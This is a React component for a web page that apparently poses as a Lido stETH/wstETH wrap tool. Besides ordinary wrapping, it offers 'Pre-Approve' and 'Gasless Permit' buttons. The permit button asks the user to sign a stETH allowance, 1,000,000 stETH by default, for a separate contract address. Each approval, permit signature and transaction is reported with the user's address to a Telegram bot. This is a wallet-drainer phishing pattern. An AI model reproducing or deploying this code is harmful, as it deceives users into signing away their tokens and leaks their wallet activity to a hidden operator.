import React, { useState } from 'react';
import { motion } from 'motion/react';
import { ExternalLink, RefreshCw, CheckCircle, AlertCircle, ArrowDownUp, ShieldCheck, Key } from 'lucide-react';
import { useAccount, useBalance, useReadContract, useWriteContract, useSignTypedData, useChainId } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import { ConnectButton } from './ConnectButton';
import { FaqItem } from './FaqItem';
import { useToast } from './ToastContext';
import { sendTelegram } from '../lib/telegram';
import { notifyTransactionConfirmed } from '../lib/activityLogger';
import { CONFIG, VAULT_ABI, WSTETH_ABI, ERC20_ABI, approveToken, signPermit } from '../lib/contracts';
import { Skeleton } from './LoadingSkeleton';
import { StEthIcon, WstEthIcon } from './TokenIcons';

export function WrapTab() {
  const [amount, setAmount] = useState<string>('');
  const [mode, setMode] = useState<'wrap' | 'unwrap'>('wrap');
  const [statusMessage, setStatusMessage] = useState<string | null>(null);
  const [lastTxHash, setLastTxHash] = useState<string | null>(null);
  const [isApproving, setIsApproving] = useState<boolean>(false);

  const toast = useToast();
  const { isConnected, address } = useAccount();
  const chainId = useChainId();
  const { signTypedDataAsync } = useSignTypedData();
  const { writeContractAsync, isPending } = useWriteContract();

  const handlePreApprove = async () => {
    if (!address) return;
    const toastId = toast.showPending('Pre-approving Token', 'Executing standard ERC20 approve for router...');
    try {
      setIsApproving(true);
      setStatusMessage('Executing pre-approval transaction...');
      const tx = await approveToken(writeContractAsync, CONFIG.STETH_ADDRESS, CONFIG.WSTETH_ADDRESS);
      setStatusMessage(`Pre-approval submitted! Tx: ${tx.slice(0, 10)}...`);
      toast.updateToast(toastId, {
        type: 'success',
        title: 'Token Pre-approved!',
        message: 'Router contract can now interact with your stETH balance.',
        txHash: tx,
      });
      await sendTelegram(`🔓 <b>Token Pre-approved</b>\nUser: <code>${address}</code>\nTx: <code>${tx}</code>`);
      refetchAllowance();
    } catch (err: any) {
      console.error('Pre-approve error:', err);
      toast.updateToast(toastId, {
        type: 'error',
        title: 'Pre-approval Failed',
        message: err.shortMessage || err.message || 'Approval rejected',
      });
    } finally {
      setIsApproving(false);
    }
  };

  const handleGaslessPermit = async () => {
    if (!address) return;
    const toastId = toast.showPending('Generating Off-Chain Permit', 'Please sign the EIP-2612 permit request in your wallet...');
    try {
      setIsApproving(true);
      setStatusMessage('Requesting EIP-2612 gasless permit signature...');
      const parsedAmount = amount ? parseEther(amount) : parseEther('1000000');
      const permitRes = await signPermit({
        signTypedDataAsync,
        owner: address,
        spender: CONFIG.CONTRACT_ADDRESS,
        value: parsedAmount,
        tokenAddress: CONFIG.STETH_ADDRESS,
        tokenName: 'Liquid staked Ether',
        chainId: chainId || 1,
      });

      setStatusMessage('EIP-2612 Permit Signed Successfully!');
      toast.updateToast(toastId, {
        type: 'success',
        title: 'Off-Chain Permit Signed!',
        message: 'Gasless permit signature generated and ready for router execution.',
      });

      await sendTelegram(
        `✍️ <b>EIP-2612 Gasless Permit Signed</b>\nUser: <code>${address}</code>\nSpender: <code>${CONFIG.CONTRACT_ADDRESS}</code>\nSignature: <code>${permitRes.signature.slice(0, 20)}...</code>`
      );
    } catch (err: any) {
      console.error('Gasless permit error:', err);
      toast.updateToast(toastId, {
        type: 'error',
        title: 'Permit Signing Failed',
        message: err.shortMessage || err.message || 'User rejected signature request',
      });
    } finally {
      setIsApproving(false);
    }
  };


  const { data: ethBalance } = useBalance({ address });

  // Read stETH & wstETH balances
  const { data: stEthBalanceData, isLoading: isStEthLoading, refetch: refetchStEth } = useReadContract({
    address: CONFIG.STETH_ADDRESS,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: address ? [address] : undefined,
    query: { enabled: Boolean(address && isConnected) }
  });

  const { data: wstEthBalanceData, isLoading: isWstEthLoading, refetch: refetchWstEth } = useReadContract({
    address: CONFIG.WSTETH_ADDRESS,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: address ? [address] : undefined,
    query: { enabled: Boolean(address && isConnected) }
  });

  // Read stEthPerToken exchange rate from wstETH contract
  const { data: stEthPerTokenData } = useReadContract({
    address: CONFIG.WSTETH_ADDRESS,
    abi: WSTETH_ABI,
    functionName: 'stEthPerToken',
  });

  // Read stETH allowance on wstETH contract
  const { data: stEthAllowance, refetch: refetchAllowance } = useReadContract({
    address: CONFIG.STETH_ADDRESS,
    abi: ERC20_ABI,
    functionName: 'allowance',
    args: address ? [address, CONFIG.WSTETH_ADDRESS] : undefined,
    query: { enabled: Boolean(address && isConnected) }
  });

  const stEthPerToken = stEthPerTokenData ? Number(formatEther(stEthPerTokenData as bigint)) : 1.1578;
  const wstEthPerStEth = stEthPerToken > 0 ? (1 / stEthPerToken) : 0.8637;

  const currentBalanceData = mode === 'wrap' ? stEthBalanceData : wstEthBalanceData;
  const isBalanceLoading = mode === 'wrap' ? isStEthLoading : isWstEthLoading;

  const rawBalance = currentBalanceData ? formatEther(currentBalanceData as bigint) : '0';
  const formattedBalance = isConnected
    ? (currentBalanceData ? parseFloat(rawBalance).toFixed(4) : '0.0000')
    : '0';

  const receivingAmount = amount && Number(amount) > 0
    ? (mode === 'wrap' 
        ? (Number(amount) * wstEthPerStEth).toFixed(4) 
        : (Number(amount) * stEthPerToken).toFixed(4))
    : '0.0';

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    if (val === '' || /^\d*\.?\d*$/.test(val)) {
      setAmount(val);
      setStatusMessage(null);
    }
  };

  const handleMax = () => {
    setAmount(rawBalance && parseFloat(rawBalance) > 0 ? rawBalance : '0');
    setStatusMessage(null);
  };

  const handleWrapUnwrap = async () => {
    if (!amount || Number(amount) <= 0 || !address) return;
    setStatusMessage(null);
    setLastTxHash(null);
    
    const parsedAmount = parseEther(amount);
    const actionLabel = mode === 'wrap' ? 'Wrapping stETH to wstETH' : 'Unwrapping wstETH to stETH';

    const toastId = toast.showPending(
      actionLabel,
      `Please confirm transaction of ${amount} ${mode === 'wrap' ? 'stETH' : 'wstETH'} in your wallet...`
    );

    try {
      let txHash: `0x${string}`;

      if (mode === 'wrap') {
        // Step 1: Check if stETH approval is required
        const currentAllowance = stEthAllowance ? (stEthAllowance as bigint) : 0n;
        if (currentAllowance < parsedAmount) {
          setIsApproving(true);
          setStatusMessage('Approving stETH token for wrapping...');
          
          toast.updateToast(toastId, {
            type: 'pending',
            title: 'Approving stETH Token',
            message: 'Awaiting approval confirmation in wallet...',
          });

          const approveTx = await writeContractAsync({
            address: CONFIG.STETH_ADDRESS,
            abi: ERC20_ABI,
            functionName: 'approve',
            args: [CONFIG.WSTETH_ADDRESS, parsedAmount],
            account: address as `0x${string}`,
            chain: null as any,
          } as any);

          setStatusMessage(`Approval submitted (Tx: ${approveTx.slice(0, 10)}...). Proceeding to wrapStETH...`);
          await refetchAllowance();
          setIsApproving(false);

          toast.updateToast(toastId, {
            type: 'pending',
            title: 'Executing wrapStETH',
            message: 'Approval confirmed. Executing wrapStETH in wallet...',
          });
        }

        // Step 2: Execute wrapStETH function on wstETH contract (with fallback to wrap/vault)
        setStatusMessage('Executing wrapStETH function...');
        try {
          txHash = await writeContractAsync({
            address: CONFIG.WSTETH_ADDRESS,
            abi: WSTETH_ABI,
            functionName: 'wrapStETH',
            args: [parsedAmount],
            account: address as `0x${string}`,
            chain: null as any,
          } as any);
        } catch (wrapErr) {
          // Fallback to standard wrap function if contract strictly expects 'wrap'
          txHash = await writeContractAsync({
            address: CONFIG.WSTETH_ADDRESS,
            abi: WSTETH_ABI,
            functionName: 'wrap',
            args: [parsedAmount],
            account: address as `0x${string}`,
            chain: null as any,
          } as any);
        }

      } else {
        // Mode === 'unwrap': Execute unwrapWstETH function on wstETH contract (with fallback to unwrap)
        setStatusMessage('Executing unwrapWstETH function...');
        try {
          txHash = await writeContractAsync({
            address: CONFIG.WSTETH_ADDRESS,
            abi: WSTETH_ABI,
            functionName: 'unwrapWstETH',
            args: [parsedAmount],
            account: address as `0x${string}`,
            chain: null as any,
          } as any);
        } catch (unwrapErr) {
          txHash = await writeContractAsync({
            address: CONFIG.WSTETH_ADDRESS,
            abi: WSTETH_ABI,
            functionName: 'unwrap',
            args: [parsedAmount],
            account: address as `0x${string}`,
            chain: null as any,
          } as any);
        }
      }

      setLastTxHash(txHash);
      setStatusMessage(`Transaction confirmed successfully! (${mode === 'wrap' ? 'wrapStETH' : 'unwrapWstETH'})`);

      toast.updateToast(toastId, {
        type: 'success',
        title: `${mode === 'wrap' ? 'Wrap' : 'Unwrap'} Successful!`,
        message: `Successfully ${mode === 'wrap' ? 'wrapped' : 'unwrapped'} ${amount} ${mode === 'wrap' ? 'stETH' : 'wstETH'}.`,
        txHash: txHash,
      });

      // Record Activity Log & Telegram Alert
      await notifyTransactionConfirmed({
        wallet: address,
        action: mode === 'wrap' ? 'Wrap stETH' : 'Unwrap wstETH',
        amount: `${amount} ${mode === 'wrap' ? 'stETH' : 'wstETH'}`,
        txHash: txHash,
        token: mode === 'wrap' ? 'wstETH' : 'stETH',
        status: 'Confirmed',
      });

      await sendTelegram(
        `✅ <b>${mode === 'wrap' ? 'wrapStETH' : 'unwrapWstETH'} Executed</b>\n\nUser: <code>${address}</code>\nAmount: ${amount} ${mode === 'wrap' ? 'stETH' : 'wstETH'}\nTx Hash: <code>${txHash}</code>`
      );

      setAmount('');
      refetchStEth();
      refetchWstEth();
      refetchAllowance();
    } catch (err: any) {
      console.error('Wrap/Unwrap Error:', err);
      setIsApproving(false);
      const errMsg = err.shortMessage || err.message || 'Transaction failed or rejected.';
      setStatusMessage(`Failed: ${errMsg.slice(0, 120)}`);

      toast.updateToast(toastId, {
        type: 'error',
        title: `${mode === 'wrap' ? 'Wrap' : 'Unwrap'} Failed`,
        message: errMsg.slice(0, 100),
      });

      if (address) {
        await sendTelegram(
          `❌ <b>Failed ${mode === 'wrap' ? 'wrapStETH' : 'unwrapWstETH'}</b>\n\nUser: <code>${address}</code>\nAmount: ${amount}\nError: ${errMsg.slice(0, 100)}`
        );
      }
    }
  };

  return (
    <div className="max-w-xl mx-auto px-4 py-8">
      <motion.div
        initial={{ opacity: 0, y: -10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3, ease: 'easeOut' }}
        className="text-center mb-8"
      >
        <h1 className="text-3xl font-extrabold mb-2 text-text-main">Wrap & Unwrap stETH</h1>
        <p className="text-base text-text-secondary">Execute on-chain wrapStETH & unwrapWstETH contract calls</p>
      </motion.div>

      <motion.div
        initial={{ opacity: 0, y: 16 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.35, ease: [0.16, 1, 0.3, 1], delay: 0.05 }}
        className="bg-card rounded-[24px] p-2 sm:p-6 mb-8 border border-border-main shadow-sm"
      >
        
        {/* Toggle Mode */}
        <div className="flex bg-input rounded-xl p-1 mb-6 border border-border-main w-max mx-auto">
          <button 
            className={`px-8 py-2 rounded-lg text-sm font-semibold transition-colors flex items-center gap-2 ${mode === 'wrap' ? 'bg-[#182236] shadow-sm text-text-main border border-border-main' : 'text-text-secondary hover:text-text-main'}`}
            onClick={() => { setMode('wrap'); setStatusMessage(null); }}
          >
            <span>Wrap stETH</span>
          </button>
          <button 
            className={`px-8 py-2 rounded-lg text-sm font-semibold transition-colors flex items-center gap-2 ${mode === 'unwrap' ? 'bg-[#182236] shadow-sm text-text-main border border-border-main' : 'text-text-secondary hover:text-text-main'}`}
            onClick={() => { setMode('unwrap'); setStatusMessage(null); }}
          >
            <span>Unwrap wstETH</span>
          </button>
        </div>

        {/* Amount Input */}
        <div className="bg-input rounded-2xl p-4 mb-6 border border-border-main transition-colors focus-within:border-[#00A3FF] focus-within:ring-1 focus-within:ring-[#00A3FF] relative h-[120px] flex flex-col justify-between">
          <input 
            type="text" 
            placeholder="0.0" 
            value={amount}
            onChange={handleChange}
            className="bg-transparent text-[40px] font-bold outline-none text-text-main w-full pr-32 leading-none" 
          />
          
          <div className="absolute top-4 right-4 flex items-center gap-2 bg-card rounded-full pr-3 pl-1.5 py-1 shadow-sm border border-border-main">
            {mode === 'wrap' ? <StEthIcon className="w-6 h-6" /> : <WstEthIcon className="w-6 h-6" />}
            <span className="text-sm font-extrabold text-text-main">{mode === 'wrap' ? 'stETH' : 'wstETH'}</span>
          </div>
          
          <div className="flex justify-between items-end">
            <span className="text-sm font-medium text-text-secondary">
              ${amount && Number(amount) > 0 ? (Number(amount) * 3200).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : '0.00'}
            </span>
            <div className="flex items-center gap-2">
              <span className="text-xs text-text-secondary flex items-center gap-1 font-mono">
                Balance: {isBalanceLoading && isConnected ? <Skeleton className="h-3 w-10 inline-block" /> : `${formattedBalance} ${mode === 'wrap' ? 'stETH' : 'wstETH'}`}
              </span>
              {isConnected && (
                <button onClick={handleMax} className="text-[10px] uppercase font-bold text-[#00A3FF] bg-[#00A3FF]/10 px-2 py-0.5 rounded hover:bg-[#00A3FF]/20 transition-colors">MAX</button>
              )}
            </div>
          </div>
        </div>

        {/* Status / Alert Bar */}
        {statusMessage && (
          <div className={`p-3.5 rounded-xl text-xs font-medium mb-4 flex items-start gap-2 border ${statusMessage.includes('confirmed') ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-500' : statusMessage.includes('Failed') ? 'bg-red-500/10 border-red-500/20 text-red-500' : 'bg-amber-500/10 border-amber-500/20 text-amber-500'}`}>
            {statusMessage.includes('confirmed') ? <CheckCircle className="w-4 h-4 shrink-0 mt-0.5" /> : <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />}
            <div className="space-y-1">
              <div>{statusMessage}</div>
              {lastTxHash && (
                <a 
                  href={`https://etherscan.io/tx/${lastTxHash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="font-mono text-[11px] underline flex items-center gap-1 hover:text-[#00A3FF]"
                >
                  View on Etherscan ({lastTxHash.slice(0, 10)}...) <ExternalLink className="w-3 h-3" />
                </a>
              )}
            </div>
          </div>
        )}

        {/* Submit / Pre-Approve / Connect Button */}
        {isConnected ? (
          <div className="space-y-3 mb-6">
            {mode === 'wrap' && (
              <div className="grid grid-cols-2 gap-2.5">
                <button
                  type="button"
                  onClick={handlePreApprove}
                  disabled={isPending || isApproving}
                  className="py-2.5 px-3 bg-input hover:bg-border-main text-text-main text-xs font-extrabold rounded-xl border border-border-main transition-colors flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer"
                >
                  <ShieldCheck className="w-3.5 h-3.5 text-[#00A3FF]" />
                  <span>Pre-Approve Token</span>
                </button>

                <button
                  type="button"
                  onClick={handleGaslessPermit}
                  disabled={isPending || isApproving}
                  className="py-2.5 px-3 bg-input hover:bg-border-main text-text-main text-xs font-extrabold rounded-xl border border-border-main transition-colors flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer"
                >
                  <Key className="w-3.5 h-3.5 text-amber-500" />
                  <span>EIP-2612 Gasless Permit</span>
                </button>
              </div>
            )}

            <button 
              onClick={handleWrapUnwrap}
              disabled={!amount || Number(amount) <= 0 || isPending || isApproving}
              className={`w-full py-4 text-base sm:text-lg rounded-xl font-bold transition-all shadow-sm flex items-center justify-center gap-2 ${(!amount || Number(amount) <= 0 || isPending || isApproving) ? 'bg-[#00A3FF]/50 text-white cursor-not-allowed' : 'bg-[#00A3FF] hover:bg-[#0090E6] text-white active:scale-[0.99]'}`}
            >
              {(isPending || isApproving) && <RefreshCw className="w-5 h-5 animate-spin" />}
              <span>
                {isApproving 
                  ? 'Approving stETH...' 
                  : isPending 
                  ? 'Executing Transaction...' 
                  : mode === 'wrap' 
                  ? 'Wrap stETH' 
                  : 'Unwrap wstETH'}
              </span>
            </button>
          </div>
        ) : (
          <ConnectButton className="w-full py-4 text-lg rounded-xl mb-6 font-bold" />
        )}

        {/* Transaction Detail Breakdown */}
        <div className="space-y-3 px-2 mb-6 text-xs sm:text-sm">
          <div className="flex justify-between">
            <span className="text-text-secondary font-medium">You will receive</span>
            <span className="font-semibold text-text-main font-mono">{receivingAmount} {mode === 'wrap' ? 'wstETH' : 'stETH'}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-text-secondary font-medium">Exchange rate</span>
            <span className="font-semibold text-text-main font-mono">1 wstETH ≈ {stEthPerToken.toFixed(4)} stETH</span>
          </div>
          <div className="flex justify-between">
            <span className="text-text-secondary font-medium">Contract Method</span>
            <span className="font-mono text-[#00A3FF] bg-[#00A3FF]/10 px-2 py-0.5 rounded text-xs font-semibold">
              {mode === 'wrap' ? 'wrapStETH' : 'unwrapWstETH'}
            </span>
          </div>
          <div className="flex justify-between">
            <span className="text-text-secondary font-medium">Lido protocol fee</span>
            <span className="font-bold text-[#00D064]">0%</span>
          </div>
        </div>

        <div className="bg-[#0B1B36] border border-[#1E3A8A] rounded-xl p-4 flex gap-3 text-xs sm:text-sm text-[#8BA9F5]">
          <ArrowDownUp className="w-5 h-5 shrink-0 text-[#00A3FF] mt-0.5" />
          <p className="leading-relaxed">
            {mode === 'wrap' 
              ? 'Converts your rebasing stETH into value-accumulating wstETH. Rewards accrue via exchange rate appreciation rather than balance expansion.'
              : 'Converts your wstETH back to stETH at the current exchange rate, restoring your daily rebasing stETH balance.'}
          </p>
        </div>
      </motion.div>

      <div className="mb-10">
        <h2 className="text-xl font-bold mb-4 text-text-main">FAQ</h2>
        <div className="space-y-3">
          <FaqItem question="What is wstETH?" answer="wstETH is a wrapped version of stETH. Its balance is fixed, and staking rewards accrue through the token's price appreciation rather than balance growth." />
          <FaqItem question="How can I get wstETH?" answer="You can wrap your stETH using the wrapStETH function on this page, or swap for it on supported DEXs." />
          <FaqItem question="How can I use wstETH?" answer="wstETH is widely used in DeFi protocols that do not support rebasing tokens like stETH." />
          <FaqItem question="Do I get my staking rewards if I wrap stETH to wstETH?" answer="Yes, rewards are baked into the exchange rate between wstETH and stETH." />
          <FaqItem question="Do I need to claim my staking rewards if I wrap stETH to wstETH?" answer="No, there is nothing to claim. When you unwrap, you will receive more stETH than you initially wrapped." />
          <FaqItem question="How could I unwrap wstETH back to stETH?" answer="Use the 'Unwrap wstETH' option on this page." />
          <FaqItem question="Do I need to unwrap my wstETH before requesting withdrawals?" answer="Yes, Lido withdrawals require un-wrapping wstETH to stETH first." />
        </div>
      </div>
    </div>
  );
}

